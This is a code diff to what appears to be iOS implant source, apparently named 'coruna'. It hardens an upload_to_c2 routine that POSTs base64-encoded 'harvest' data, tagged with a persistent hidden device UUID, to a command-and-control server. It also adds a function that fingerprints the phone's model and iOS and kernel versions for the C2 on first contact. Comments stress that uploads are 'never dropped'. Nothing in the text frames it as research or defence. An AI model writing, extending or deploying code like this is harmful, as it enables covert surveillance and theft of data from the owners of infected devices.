@@ -9,6 +9,8 @@
  */
 
 #import <Foundation/Foundation.h>
+#include <sys/utsname.h>
+#include <sys/sysctl.h>
 #include "c2.h"
 
 /* --------------------------------------------------------------------------
@@ -16,17 +18,30 @@
  * -------------------------------------------------------------------------- */
 static NSString *coruna_device_uuid(void) {
     static NSString *cached = nil;
-    if (cached) return cached;
-    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
-    NSString *key = @"__cru_id";
-    NSString *u = [d stringForKey:key];
-    if (!u || u.length == 0) {
-        u = [[NSUUID UUID] UUIDString];
-        [d setObject:u forKey:key];
-        [d synchronize];
-    }
-    cached = u;
-    return u;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
+        NSString *key = @"__cru_id";
+        NSString *u = [d stringForKey:key];
+        if (!u || u.length == 0) {
+            u = [[NSUUID UUID] UUIDString];
+            [d setObject:u forKey:key];
+            [d synchronize];
+        }
+        cached = u;
+    });
+    return cached;
+}
+
+/* --------------------------------------------------------------------------
+ * Safe UTF-8 conversion — stringWithUTF8String: returns nil on invalid bytes,
+ * which would crash NSDictionary initialisation.  This helper falls back to
+ * an empty string so the upload is never dropped due to encoding issues.
+ * -------------------------------------------------------------------------- */
+static NSString *c2_safe_str(const char *s) {
+    if (!s) return @"";
+    NSString *r = [NSString stringWithUTF8String:s];
+    return r ? r : @"";
 }
 
 /* --------------------------------------------------------------------------
@@ -45,11 +60,11 @@ void upload_to_c2(const char *category, const char *path,
         NSString *uuid = coruna_device_uuid();
 
         NSDictionary *bodyDict = @{
-            @"deviceUUID":   uuid,
-            @"category":     [NSString stringWithUTF8String:category    ?: "data"],
-            @"path":         [NSString stringWithUTF8String:path        ?: ""],
-            @"description":  [NSString stringWithUTF8String:description ?: ""],
-            @"data":         [NSString stringWithUTF8String:b64data     ?: ""]
+            @"deviceUUID":  uuid,
+            @"category":    c2_safe_str(category    ?: "data"),
+            @"path":        c2_safe_str(path        ?: ""),
+            @"description": c2_safe_str(description ?: ""),
+            @"data":        c2_safe_str(b64data     ?: ""),
         };
         NSData *body = [NSJSONSerialization dataWithJSONObject:bodyDict
                                                        options:0 error:nil];
@@ -61,8 +76,6 @@ void upload_to_c2(const char *category, const char *path,
                                 timeoutInterval:15.0];
         [req setHTTPMethod:@"POST"];
         [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-        [req setValue:[NSString stringWithFormat:@"%lu", (unsigned long)body.length]
-   forHTTPHeaderField:@"Content-Length"];
         [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
         [req setHTTPBody:body];
 
@@ -75,12 +88,47 @@ void upload_to_c2(const char *category, const char *path,
         NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
         [[session dataTaskWithRequest:req
                     completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+            (void)d; (void)r; (void)e;
             dispatch_semaphore_signal(sem);
         }] resume];
 
         dispatch_semaphore_wait(sem,
             dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
         [session invalidateAndCancel];
+    }
+}
+
+/* --------------------------------------------------------------------------
+ * Device info — sent once on first contact so C2 can identify the device
+ * before any harvest data arrives.
+ * -------------------------------------------------------------------------- */
+void upload_device_info(void) {
+    @autoreleasepool {
+        struct utsname un;
+        uname(&un);
+
+        /* iOS version via sysctlbyname("kern.osproductversion") */
+        char ios_ver[64] = "unknown";
+        size_t vs = sizeof(ios_ver);
+        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);
+
+        char kern_ver[256] = "unknown";
+        size_t ks = sizeof(kern_ver);
+        sysctlbyname("kern.version", kern_ver, &ks, NULL, 0);
+
+        NSDictionary *info = @{
+            @"machine":      @(un.machine),    /* e.g. "iPhone15,2" */
+            @"sysname":      @(un.sysname),    /* "Darwin" */
+            @"release":      @(un.release),    /* "23.2.0" */
+            @"ios_version":  @(ios_ver),       /* "17.2" */
+            @"kern_version": @(kern_ver),      /* full kern.version string */
+        };
+
+        NSData *json  = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
+        if (!json) return;
+        NSString *b64 = [json base64EncodedStringWithOptions:0];
+        upload_to_c2("system", "/coruna/device_info",
+                     "Device identification", b64.UTF8String);
     }
 }
 
